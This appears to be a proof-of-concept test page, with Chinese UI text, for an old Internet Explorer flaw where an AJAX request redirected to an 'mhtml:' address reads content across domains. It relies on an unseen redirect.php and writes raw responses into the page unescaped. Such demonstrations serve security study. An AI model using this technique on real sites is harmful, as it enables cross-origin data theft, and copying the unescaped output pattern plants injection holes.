<html>   
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script language="JavaScript">   

var request = InitXMLHttpRequest();
var loading_timer = null;

var $ = document.getElementById; // 方便使用

function StartTest() {
    var url = $("url").value;
    if(!url) {
    	alert("请输入要测试的地址");
    	return;
    }
    
    var use_mhtml = $('use_mhtml').checked ? 1 : 0;
    
    // 显示加载进度
    var progress = $("progress");
    progress.style.display = "block";
    // ajax请求中。。
    loading_timer = setInterval(function(){
    	progress.innerHTML += "。";
    }, 600);
    
    // 增加了time防止缓存
    url = "redirect.php?url=" + url + "&use_mhtml=" + use_mhtml+ "&time=" + new Date();
    $("result").innerHTML = "发送请求至:" + url + "<br /> ";
    
    request.open('GET', url , true);
    request.onreadystatechange = onStateChange;
    request.send();
}

function InitXMLHttpRequest() {
    var request;
    try {
        request = new XMLHttpRequest();
    }
    catch(trymicrosoft) {
        try {
            request = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch(othermicrosoft) {
            try {
                request = new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch(failed) {
                request = false;
            }
        }
    }
    // Initialised?
    if (!request) {
        alert("您的浏览器不支持Ajax");
    }
    else {
        return request;
    }
}

function onStateChange() {
	$("response").innerHTML += "State:" + request.readyState + "<br />";
	
    if (request.readyState == 4) {
    	var response = request.responseText;
    	
    	// 隐藏进度条
    	$("progress").style.display = "none";
    	clearInterval(loading_timer);

        $("response").innerHTML += "响应内容(长度:" + response.length + "):<pre>" + response + "</pre>";
    }
}
</script>   
</head>
<body style="font-size:12px">
<div style="background-color: #efefef;padding:5px;margin:10px 0;line-height:20px;">
	<h3 style="margin: 0 0 10px 0">IE mhtml协议跨域测试</h3>
	IE在发起Ajax请求时如果请求重定向至mhtml协议的地址比如
	"<u>mhtml:http://anydomain.cn/</u>"时，可以进行跨域访问<br />
	请在IE下输入想要测试的网址进行访问(不用自己添加mhtml地址)，不过这个漏洞也是有防御方法的，见
</div>
<div id="start">
	地址：<input type="text" id="url" name="url" /> 使用mhtml跳转 <input type="checkbox" value='1' checked="checked" id="use_mhtml">
	<button onclick="StartTest();">发起请求</button>
</div>
<hr />
<div id="progress" style="display:none;background: #dedede;padding: 10px;">加载中。。。</div>
<div id="result"></div>   
<div id="response" style="border: 1px solid #eee;padding:10px"></div> 
</body>   
</html>   

